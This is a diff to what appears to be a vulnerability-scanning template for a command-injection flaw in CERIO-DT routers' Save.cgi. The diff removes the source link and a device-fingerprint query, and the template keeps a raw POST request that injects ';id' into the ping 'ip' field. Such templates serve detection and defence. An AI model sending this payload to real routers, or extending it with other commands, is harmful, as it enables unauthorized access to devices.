@@ -3,12 +3,8 @@ info:
   name: CERIO-DT系列路由器Save.cgi接口存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/clghsycqriuhvirv'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: clghsycqriuhvirv
-    fofa: title="DT-100G-N" || title="DT-300N" || title="DT-100G" || title="AMR-3204G" || title="WMR-200N"
 http:
 - raw:
   - 'POST /cgi-bin/Save.cgi?cgi=PING HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     pid=2061&ip=127.0.0.1;id&times=1
